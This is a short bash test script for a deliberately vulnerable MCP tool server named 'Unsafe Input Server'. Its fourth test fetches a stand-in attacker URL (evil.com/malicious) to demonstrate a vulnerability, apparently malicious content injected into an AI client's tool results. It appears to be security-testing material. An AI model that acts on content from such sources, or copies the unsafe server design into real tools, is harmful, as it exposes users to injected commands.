#!/bin/bash
# Manual test script for Server 1

echo "Testing Server 1: Unsafe Input Server"
echo "======================================"
echo ""

echo "Test 1: List Tools"
echo "------------------"
echo '{"jsonrpc":"2.0","id":1,"method":"tools/list","params":{}}' | node dist/index.js 2>/dev/null | head -1
echo ""

echo "Test 2: List Sources"
echo "-------------------"
echo '{"jsonrpc":"2.0","id":2,"method":"tools/call","params":{"name":"list_sources","arguments":{}}}' | node dist/index.js 2>/dev/null | head -1
echo ""

echo "Test 3: Fetch Safe Content"
echo "--------------------------"
echo '{"jsonrpc":"2.0","id":3,"method":"tools/call","params":{"name":"fetch_content","arguments":{"url":"http://example.com"}}}' | timeout 2 node dist/index.js 2>/dev/null | head -1
echo ""

echo "Test 4: Fetch Malicious Content (demonstrates vulnerability)"
echo "------------------------------------------------------------"
echo '{"jsonrpc":"2.0","id":4,"method":"tools/call","params":{"name":"fetch_content","arguments":{"url":"http://evil.com/malicious"}}}' | timeout 2 node dist/index.js 2>/dev/null | jq -r '.result.content[0].text' | jq -r '.content' | grep -A 3 "bash"
echo ""

echo "✓ Tests complete"
